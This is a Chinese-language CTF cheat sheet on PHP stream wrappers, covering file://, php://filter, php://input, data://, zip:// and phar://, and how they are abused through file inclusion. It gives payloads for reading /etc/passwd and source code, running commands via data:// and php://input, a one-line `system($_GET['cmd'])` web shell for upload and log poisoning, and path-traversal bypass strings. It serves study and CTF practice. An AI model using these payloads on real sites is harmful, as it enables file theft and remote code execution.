# PHP伪协议（流包装器）

>[PHP 支持的协议和封装协议](https://www.php.net/manual/zh/wrappers.php)
>
>[PHP 输入/输出流](https://www.php.net/manual/zh/wrappers.php.php)

PHP 伪协议本质上是 **stream wrapper（流包装器）**。很多 PHP 函数都能用 `协议://资源` 的形式访问数据，例如：

```php
include($_GET["file"]);
file_get_contents($_GET["file"]);
fopen($_GET["file"], "r");
```

CTF Web 中，伪协议常用于：

- 文件包含。
- 源码读取。
- 任意文件读取。
- 配合上传、日志、Session 文件打 RCE。
- Phar 反序列化触发。
- 绕过路径、后缀、关键字过滤。

## 常见协议总览

| 协议 | 常见用途 | 关键条件 |
| --- | --- | --- |
| `file://` | 访问本地文件 | 不依赖 `allow_url_fopen` / `allow_url_include` |
| `php://filter` | 读取源码、编码/解码过滤 | 常用于 `file_get_contents`、`include` 源码泄露 |
| `php://input` | 读取原始 POST body | 包含执行时通常需要 `allow_url_include=On` |
| `data://` | 内联数据，配合包含执行代码 | 受 `allow_url_fopen`、`allow_url_include` 影响 |
| `zip://` | 读取压缩包内文件 | 需要 zip 扩展，`#` 在 URL 中写成 `%23` |
| `phar://` | 读取 Phar 包内容、触发 Phar 相关利用 | 读取已有 Phar 不需要 `phar.readonly=Off` |
| `glob://` | 按通配符列目录/找路径 | 只能列匹配结果，不能直接读文件内容 |
| `expect://` | 执行系统命令 | 需要额外安装 expect 扩展，实战环境少见 |
| `http://` / `ftp://` | 访问远程资源 | 受 `allow_url_fopen` 影响，远程包含还要 `allow_url_include=On` |
| `compress.zlib://` | 读取 gzip 压缩数据 | 需要 zlib 支持 |

先看配置：

```php
phpinfo();
ini_get("allow_url_fopen");
ini_get("allow_url_include");
ini_get("open_basedir");
ini_get("phar.readonly");
```

## `file://`

读取本地文件。

```text
file:///etc/passwd
file:///var/www/html/index.php
file:///C:/Windows/win.ini
```

示例：

```php
<?php
echo file_get_contents($_GET["file"]);
```

Payload：

```text
?file=file:///etc/passwd
?file=/etc/passwd
?file=../../../../etc/passwd
```

CTF 注意点：

- Linux 路径区分大小写，`flag.php` 和 `FlAg.Php` 不是同一个文件。
- Windows 路径通常不区分大小写。
- `open_basedir` 会限制可访问目录。
- `file://` 不是远程协议，不依赖 `allow_url_include`。

## `php://filter`

最常见用途：读取 PHP 源码，避免 PHP 文件被服务器执行。

```text
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=index.php
```

示例代码：

```php
<?php
echo file_get_contents($_GET["file"]);
```

Payload：

```text
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

如果是文件包含：

```php
<?php
include($_GET["file"]);
```

Payload：

```text
?file=php://filter/read=convert.base64-encode/resource=index.php
```

这时页面输出的是 Base64 编码后的源码，需要再解码。

常用过滤器：

| 过滤器 | 作用 |
| --- | --- |
| `convert.base64-encode` | Base64 编码 |
| `convert.base64-decode` | Base64 解码 |
| `convert.quoted-printable-encode` | Quoted-printable 编码 |
| `convert.quoted-printable-decode` | Quoted-printable 解码 |
| `convert.iconv.*.*` | 字符集转换 |
| `string.rot13` | ROT13 |
| `string.toupper` | 转大写 |
| `string.tolower` | 转小写 |
| `string.strip_tags` | 去除 HTML/PHP 标签，PHP 8.0 起废弃 |

过滤器可以链式组合：

```text
php://filter/read=string.rot13|convert.base64-encode/resource=index.php
```

CTF 常见点：

- 协议名大小写通常不敏感：`PHP://FILTER` 也可能可用。
- Linux 文件名大小写敏感，不能把 `flag.php` 随便写成 `FlAg.Php`。
- `resource=` 后面才是真正要读取的文件。
- `read=` 可省略，但写清楚更不容易乱。

## `php://input`

`php://input` 用来读取原始请求体。

```php
<?php
echo file_get_contents("php://input");
```

POST body：

```text
hello=ctf
```

页面会输出原始 body。

`php://input` 自己不会执行 PHP 代码，只有被 `include`、`require` 或 `eval` 等危险点处理时才可能执行。

漏洞示例：

```php
<?php
include($_GET["file"]);
```

Payload：

```text
GET  /index.php?file=php://input
POST <?php system("id"); ?>
```

限制：

- 配合 `include` 执行时通常需要 `allow_url_include=On`。
- `multipart/form-data` 上传场景下通常不能直接用 `php://input` 读取普通上传内容。
- `php://input` 只能读取请求体，GET 请求没有 body 时读不到东西。

## `data://`

`data://` 可以把数据直接写在 URL 里。配合文件包含时，可把内联 PHP 代码当作被包含文件。

漏洞示例：

```php
<?php
include($_GET["file"]);
```

普通写法：

```text
?file=data://text/plain,<?php system("id"); ?>
```

Base64 写法：

```text
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==
```

其中：

```php
<?php system("id"); ?>
```

限制：

- 受 `allow_url_fopen` 影响。
- 用于 `include` / `require` 执行时还需要 `allow_url_include=On`。
- URL 中的特殊字符需要编码，例如空格、`+`、`#`、`?`。

## `zip://`

`zip://` 可以读取 ZIP 压缩包内部文件。

语法：

```text
zip://压缩包路径#内部文件名
```

URL 中 `#` 是片段标记，必须编码为 `%23`：

```text
zip://./upload/shell.zip%23shell.php
```

文件包含场景：

```php
<?php
include($_GET["file"]);
```

Payload：

```text
?file=zip://./upload/shell.jpg%23shell.php
```

CTF 常见点：

- 上传 ZIP 文件后，如果只检查外层后缀，可以改名为 `.jpg`。
- 包内文件是 PHP 代码，被 `include` 后可能执行。
- 需要服务器启用 zip 扩展。

## `phar://`

`phar://` 可以访问 Phar 包或部分压缩包中的文件。

```text
phar://./test.phar/index.php
phar://./upload/shell.jpg/shell.php
```

CTF 常见方向：

- 文件包含读取 Phar 内部文件。
- 配合文件操作函数触发 Phar 元数据反序列化。
- 上传图片马形式的 Phar 文件，再通过 `phar://` 访问。

注意：

- `phar.readonly=On` 主要限制创建或修改 Phar，不影响读取已有 Phar。
- Phar 反序列化触发方式和 PHP 版本有关，具体题目要按环境测试。
- `open_basedir` 仍可能限制路径访问。

## `glob://`

`glob://` 用于按通配符匹配路径，常见于探测目录结构。

```php
<?php
print_r(glob("glob:///*"));
```

示例：

```text
glob:///var/www/html/*
glob://./*
```

它适合列文件名，不适合直接读取文件内容。

## `expect://`

`expect://` 可以执行系统命令，但它不是 PHP 默认内置能力，通常需要额外安装 expect 扩展。

```text
expect://id
```

CTF 里如果能用它，通常说明环境非常特殊；普通靶场不要默认指望它存在。

## `php://stdin` / `stdout` / `stderr`

这几个更多出现在 CLI 场景，Web 做题较少。

读取标准输入：

```php
<?php
$f = fopen("php://stdin", "r");
while (!feof($f)) {
    echo fgets($f);
}
```

写标准输出：

```php
<?php
$f = fopen("php://stdout", "w");
fwrite($f, "test");
fclose($f);
```

写标准错误：

```php
<?php
$f = fopen("php://stderr", "w");
fwrite($f, "error");
fclose($f);
```

注意拼写是 `stderr`，不是 `sterr`。

## `php://memory` / `php://temp`

用于临时读写内存流。

```php
<?php
$fp = fopen("php://memory", "r+");
fwrite($fp, "hello");
rewind($fp);
echo stream_get_contents($fp);
```

Web CTF 中不如 `filter`、`input` 常见，但审计源码时可能遇到。

## 常见利用场景

### 源码泄露

代码：

```php
<?php
include($_GET["file"]);
```

Payload：

```text
?file=php://filter/read=convert.base64-encode/resource=index.php
```

### 文件读取

代码：

```php
<?php
echo file_get_contents($_GET["file"]);
```

Payload：

```text
?file=/etc/passwd
?file=file:///etc/passwd
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

### 代码执行

代码：

```php
<?php
include($_GET["file"]);
```

Payload：

```text
?file=data://text/plain,<?php system("id"); ?>
```

或：

```text
GET  /index.php?file=php://input
POST <?php system("id"); ?>
```

### 包含上传文件

上传文件内容：

```php
<?php system($_GET["cmd"]); ?>
```

包含：

```text
?file=./upload/avatar.jpg&cmd=id
```

前提是文件内容会被 PHP 解析，或通过 `zip://`、`phar://` 等方式包含包内 PHP 文件。

### 包含日志文件

先把 PHP 代码写进访问日志，例如 User-Agent：

```php
<?php system($_GET["cmd"]); ?>
```

再包含日志：

```text
?file=/var/log/nginx/access.log&cmd=id
```

日志路径因环境而异。

### 包含 Session 文件

如果能控制 Session 内容，并且知道 `session.save_path`：

```text
/tmp/sess_<PHPSESSID>
```

可能通过文件包含执行 Session 文件里的 PHP 代码。

## 绕过思路

协议名过滤：

```text
php://filter
PHP://FILTER
pHp://FilTer
```

路径过滤：

```text
../flag.php
..%2fflag.php
....//flag.php
././flag.php
/var/www/html/flag.php
```

特殊字符编码：

| 字符 | URL 编码 |
| --- | --- |
| `:` | `%3A` |
| `/` | `%2F` |
| `?` | `%3F` |
| `#` | `%23` |
| 空格 | `%20` |
| 换行 | `%0A` |

后缀限制：

```php
include($_GET["file"] . ".php");
```

可尝试方向：

- `php://filter` 读取源码。
- 目录穿越找真实文件。
- 上传可控文件再包含。
- 老版本 PHP 的 `%00` 截断，仅 PHP 5.3.4 之前可能有效。
- 超长路径截断是老环境技巧，新环境一般不要默认可用。

## 常见误区

- `php://input` 只是读取原始 body，不会自动执行代码。
- `file_get_contents("php://filter/...")` 是读取内容，不是执行。
- `include("php://filter/...")` 常用于源码泄露，因为包含到的是编码后的文本。
- 协议名可能大小写不敏感，但 Linux 文件名大小写敏感。
- `data://text/plain;base64,...` 的 Base64 标记在逗号前面，不是 `data://text/plain,base64,...`。
- `zip://` 中的 `#` 放进 URL 时要写成 `%23`。
- `expect://` 很少默认开启。
- `phar.readonly=Off` 不是读取已有 Phar 的必要条件。

## 快速检查清单

1. 危险函数是不是 `include` / `require` / `file_get_contents` / `fopen` / `readfile`。
2. 参数是否用户可控。
3. 是否能用 `php://filter` 读源码。
4. 是否能用 `data://` 或 `php://input` 执行代码。
5. 是否能上传文件后包含。
6. 是否能包含日志或 Session。
7. 是否受 `open_basedir`、`allow_url_include`、`disable_functions` 限制。
8. 目标系统是 Linux 还是 Windows，路径大小写和分隔符不同。
